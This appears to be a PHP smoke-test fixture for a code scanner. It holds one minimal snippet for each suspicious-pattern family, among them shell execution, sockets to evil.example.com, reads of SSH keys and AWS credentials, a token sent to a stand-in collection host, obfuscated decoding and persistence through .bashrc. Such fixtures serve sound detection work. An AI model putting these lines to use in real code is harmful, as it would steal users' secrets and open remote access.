<?php
// Smoke sample: every TAA PHP family fires at least once. Each block is the
// smallest code that the family claims, not a working program.

function cmd_exec(string $cmd, array $pipes): void
{
    system($cmd);
    exec("id -a");
    $out = shell_exec($cmd);
    passthru($cmd);
    $pipe = popen($cmd, "r");
    $proc = proc_open($cmd, [], $pipes);
    pcntl_exec("/bin/sh", ["-c", $cmd]);
    $whoami = `id`;
}

function net_general(string $url, $ch, $mh): void
{
    $running = 1;
    $body = curl_exec($ch);
    curl_multi_exec($mh, $running);
    file_get_contents("http://collect.example.com/beacon");
    $client->post("https://collect.example.com/drop", ["k" => "v"]);
    $client->get($url);
    $client->request("POST", $url);
}

function net_socket(): void
{
    $fp = fsockopen("evil.example.com", 4444);
    $fp2 = pfsockopen("evil.example.com", 4444);
    $stream = stream_socket_client("tcp://evil.example.com:4444");
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    socket_connect($sock, "10.0.0.9", 31337);
}

function dyn_eval(string $code, $fn, $arg, string $subj): void
{
    $body = '$a;';
    $repl = '$a';
    eval($code);
    assert("phpinfo()");
    create_function('$a', $body);
    call_user_func($fn, $arg);
    call_user_func_array($fn, [$arg]);
    preg_replace('/run_this_/e', $repl, $subj);
}

function fil_probe(string $home): void
{
    $key = file_get_contents("/root/.ssh/id_rsa");
    $aws = fopen($home . "/.aws/credentials", "r");
}

function env_secret(): string
{
    $token = getenv("API_TOKEN");
    $aws = $_ENV["AWS_SECRET_ACCESS_KEY"];
    $cookie = $_SERVER["HTTP_COOKIE"];
    return $token . $aws . $cookie;
}

function obf_exec(string $blob): void
{
    $decoded = base64_decode($blob);
    $inflated = gzinflate($decoded);
    $object = unserialize($inflated);
    $rotated = str_rot13($blob);
    $uu = convert_uudecode($blob);
}

function exfiltrate($ch, string $to): void
{
    $token = getenv("API_TOKEN");
    curl_setopt($ch, CURLOPT_URL, "https://collect.example.com/log?t=" . $token);
    mail($to, "report", $token);
}

function persist(string $home, $hook, $stage2, $payload): void
{
    $cron = "crontab -l";
    file_put_contents($home . "/.bashrc", $payload);
    register_shutdown_function($hook);
    ini_set("auto_prepend_file", $stage2);
}

function emb_data_dump(string $out, $fh): void
{
    file_put_contents($out, $dataset);
    fwrite($fh, $raw_data);
    fputcsv($fh, $samples);
}

function emb_copy_export(string $src, string $result_path): void
{
    copy($src, "output/dump.bin");
    rename($src, $result_path);
}

function emb_log_dump($logger): void
{
    echo $dataset;
    print($batch);
    var_dump($raw_data);
    error_log($samples);
    $logger->info($dataset);
}

function emb_stego_weight(string $chunk): void
{
    $weights_hidden = $weights_data;
    save_blob(base64_encode($chunk));
    save_archive(gzcompress($chunk));
}
